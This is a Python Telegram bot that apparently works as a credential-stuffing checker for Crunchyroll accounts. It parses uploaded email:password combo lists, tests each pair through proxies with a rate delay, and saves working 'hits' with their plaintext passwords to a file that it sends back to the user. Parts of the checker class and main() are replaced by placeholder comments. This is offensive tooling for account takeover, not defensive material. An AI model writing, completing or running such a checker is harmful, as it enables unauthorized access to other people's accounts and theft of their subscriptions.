#!/usr/bin/env python3
import os
import asyncio
import uuid
import random
import requests
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram import F
from aiogram.types import FSInputFile

BOT_TOKEN = os.getenv("BOT_TOKEN")

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

checker = None
proxies = []
stats = {'checked': 0, 'premium': 0, 'free': 0, 'invalid': 0}

RATE_DELAY = 1.8

class CrunchyrollChecker:
    def __init__(self, proxies=None):
        self.proxies = proxies or []
        self.proxy_index = 0
        self.countries = { ... }  # (your full countries dict - unchanged)

    # ... (rest of your class check method remains same)

async def send_result(chat_id, result):
    if result['status'] not in ['PREMIUM', 'FREE']:
        return

    capture = f"""
{'='*70}
EMAIL: {result['email']}
PASSWORD: {result['password']}
STATUS: {result['status']}
... (full details)
{'='*70}
"""
    with open("hits.txt", "a", encoding="utf-8") as f:
        f.write(capture + "\n")


@dp.message(F.document | F.text)
async def handle(message: types.Message):
    global checker

    # ... (proxy handling unchanged)

    if message.document:
        file = await bot.get_file(message.document.file_id)
        content = (await bot.download_file(file.file_path)).read().decode('utf-8', errors='ignore')
    else:
        content = message.text

    lines = []
    for raw in content.splitlines():
        raw = raw.strip()
        if not raw or ':' not in raw:
            continue
        if '@' in raw:
            part = raw.split(':', 1)
            if len(part) == 2 and '@' in part[0]:
                email = part[0].strip()
                password = part[1].split()[0].strip()
                lines.append(email + ":" + password)

    if not lines:
        return await message.answer("No valid email:password found.")

    # FIX: Clear old results before new check
    open("hits.txt", "w").close()

    checker = CrunchyrollChecker(proxies)

    total = len(lines)
    progress_msg = await message.answer("Processing 0%")

    for i, line in enumerate(lines, 1):
        email, password = line.split(":", 1)
        percentage = int((i / total) * 100)
        await progress_msg.edit_text(f"Processing {percentage}%")

        result = checker.check(email.strip(), password.strip())

        stats['checked'] += 1
        if result['status'] == 'PREMIUM':
            stats['premium'] += 1
        elif result['status'] == 'FREE':
            stats['free'] += 1
        else:
            stats['invalid'] += 1

        await send_result(message.from_user.id, result)

        await asyncio.sleep(RATE_DELAY)

    if os.path.exists("hits.txt") and os.path.getsize("hits.txt") > 0:
        await message.answer_document(FSInputFile("hits.txt"), caption="✅ Here are all FREE + PREMIUM accounts with full details")
    else:
        await message.answer("No FREE or PREMIUM accounts found.")


# ... (rest of the code - main() etc. remains same)
